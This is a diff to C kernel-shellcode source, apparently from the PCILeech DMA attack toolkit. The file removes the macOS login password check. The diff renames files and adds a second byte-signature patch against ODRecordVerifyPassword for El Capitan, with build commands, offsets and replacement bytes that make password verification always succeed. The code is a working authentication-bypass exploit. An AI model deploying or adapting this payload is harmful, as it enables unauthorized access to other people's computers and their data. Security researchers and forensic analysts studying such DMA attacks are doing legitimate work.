@@ -1,15 +1,15 @@
-// ax64_unlock.c : kernel code to remove the password requirement when logging on to OS X.
+// macos_unlock.c : kernel code to remove the password requirement when logging on to macOS.
 //
 // (c) Ulf Frisk, 2016
 // Author: Ulf Frisk, pcileech@frizk.net
 //
 // compile with:
-// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel ax64_common.c
-// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel ax64_unlock.c
-// ml64.exe ax64_common_a.asm /Feax64_unlock.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main ax64_unlock.obj ax64_common.obj
-// shellcode64.exe -o ax64_unlock.exe "APPLE OS X UNLOCKER - REMOVE PASSWORD REQUIREMENT!               \n=================================================================\nREQUIRED OPTIONS:                                                \n  -0   : Set to one (1) in order to unlock.                      \n         Example: '-0 1'.                                        \n===== RESULT AFTER UNLOCK ATTEMPT (0=SUCCESS) ===================%s\nSTATUS        : 0x%08X  \n=================================================================\n"
+// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel macos_common.c
+// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel macos_unlock.c
+// ml64.exe macos_common_a.asm /Femacos_unlock.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main macos_unlock.obj macos_common.obj
+// shellcode64.exe -o macos_unlock.exe "APPLE macOS UNLOCKER - REMOVE PASSWORD REQUIREMENT!              \n=================================================================\nREQUIRED OPTIONS:                                                \n  -0   : Set to one (1) in order to unlock.                      \n         Example: '-0 1'.                                        \n===== RESULT AFTER UNLOCK ATTEMPT (0=SUCCESS) ===================%s\nSTATUS        : 0x%08X  \n=================================================================\n"
 //
-#include "ax64_common.h"
+#include "macos_common.h"
 
 //----------------------------------------------------------------------------------------------------------
 
@@ -48,7 +48,7 @@ BOOL Unlock_FindAndPatch(PKMDDATA pk, PBYTE pbPage, PSIGNATURE pSignatures, DWOR
 	return result;
 }
 
-#define NUMBER_OF_SIGNATURES 1
+#define NUMBER_OF_SIGNATURES 2
 STATUS Unlock(PKMDDATA pk)
 {
 	SIGNATURE oSigs[NUMBER_OF_SIGNATURES] = {
@@ -56,6 +56,11 @@ STATUS Unlock(PKMDDATA pk)
 			{ .cbOffset = 0xfce,.cb = 6,.pb = { 0xe8, 0x69, 0xc4, 0x00, 0x00, 0xeb, 0x02, 0x31 } },
 			{ .cbOffset = 0xfd3,.cb = 6,.pb = { 0xeb, 0x02, 0x31, 0xdb, 0x88, 0xd8, 0x48, 0x83 } },
 			{ .cbOffset = 0xfd7,.cb = 2,.pb = { 0xb0, 0x01 } } }
+		},
+		{ .chunk = { // CFOpenDirectory!ODRecordVerifyPassword (El Capitan | 466064 bytes)
+			{ .cbOffset = 0x134,.cb = 8,.pb = { 0x08, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xf7, 0xe8 } },
+			{ .cbOffset = 0x13c,.cb = 8,.pb = { 0x3e, 0xc4, 0x00, 0x00, 0xeb, 0x02, 0x31, 0xdb } },
+			{ .cbOffset = 0x144,.cb = 2,.pb = { 0xb0, 0x01 } } }
 		},
 	};
 	PBYTE pbMemoryMap;
